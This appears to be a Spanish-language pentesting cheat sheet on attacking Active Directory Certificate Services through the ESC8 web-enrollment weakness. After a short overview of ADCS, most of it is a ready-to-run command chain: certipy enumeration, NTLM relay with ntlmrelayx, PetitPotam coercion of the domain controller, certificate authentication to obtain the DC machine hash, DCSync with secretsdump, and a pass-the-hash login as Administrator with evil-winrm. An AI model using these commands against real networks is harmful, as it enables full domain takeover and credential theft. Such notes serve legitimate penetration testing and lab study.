# ADCS Attacks 

Tags: #Windows #PrivEsc #ESC #Linux #ADCS #ESC8  

Es un servicio de infraestructura de clave pública de Microsoft
	- Emitir
	- Administrar
	- Publicar / Revocar certificados digitales 

Utilidades practicas:
	- Emitir certificados para autenticación en computadores / servidores
	- Acceder a redes Wifi EMpresariales (WPA - Enterprise)
	- Acceder a redes VPN

Componentes:
- CA (Autoridad Certificadora)
- Certificate Templates 
	- Quien emite el certificado
	- Duración 
	- Quien puede usarlo 
	- Los permisos 

# ESC 8 Web Enrollment HTTP

**Requisitos:**

- Web enrollment:
     HTTP:     Enabled = True 
     HTTPS:   Enabled = False 

## Enumeración General 

```bash 
# Buscar certificados vulnerables 
❯ certipy-ad find -u 'user' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout

Donde se obtiene:
	- CA Name 
	- Template Name  
	- Enrollment Rights -> (Quién puede solicitar el certificado directamente)
```

## ESC 8: Forma 1

* [PetitPotam](https://github.com/topotam/PetitPotam)

```bash 
Paso 1:
❯ curl http://IP/certsrv/    # Saber si la máquina víctima tiene activado 'Microsoft Active Directory Certificate Services'

❯ certipy find -u user@domain -p password -dc-ip DC_IP
# Otra forma de hacerlo si ya se tienen credenciales de algun usuario de dominio para identificar la máquina que tiene el CA 
```

```bash 
Paso 2:
# Reenvía las credenciales 
❯ impacket-ntlmrelayx -t http://IP/certsrv/certfnsh.asp -smb2support --adcs --template domaincontroller

	# smb2support = Habilita soporte para SMB2
	# adcs = Activa el modo AD CS (Vamos a abusar de certificados)
	# template = Plantilla a utilizar 

# PLANTILLAS:
- DomainController
- KerberosAuthentication
- Machine 
```

```bash 
Paso 3:
❯ python3 PetitPotam.py IP_Kali IP_DC
# Si falla, es porque necesita autenticación 

# Ejecutar el ataque y el certificado se guarda en un archivo 'dc01.pfx'
❯ python3 PetitPotam.py -d domain.corp -u 'user' -p 'P@$$w0rd123!' IP_Kali IP_DC

	# IP_Kali = Dirección IP de la máquina atacante 
	# IP_DC   = Dirección IP del DC
	# 

Nota:
	- Si el ataque fue exitoso, se obtendrá un certificado que se puede usar con Rubeus para solicitar un TGT.
```

```bash 
Paso 4:
# Obtener el TGT como DC01$ (Cuenta de máquina)
❯ certipy-ad auth -pfx dc01.pfx -username 'DC01$' -domain domain.corp -dc-ip IP_DC

	# pfx = Certificado a usar obtenido del comando anterior
	# username = DC01$ cuenta de máquina 

# Validar el hash NT
❯ nxc smb IP -u 'DC01$' -H 24e014f2ac9bbe2ec3be1571fe9de936
```

```bash 
Paso 5:
# Hacer DCSYNC
❯ impacket-secretsdump -hashes :24e014f2ac9bbe2ec3be1571fe9de936 domain.corp/'DC01$'@IP_DC 

Paso 6:
# Ingresar como la cuenta Administrator 
❯ evil-winrm -i IP_DC -u 'Administrator' -H '4366ec0f86e29be2a4a5e87a1ba922ec'
```


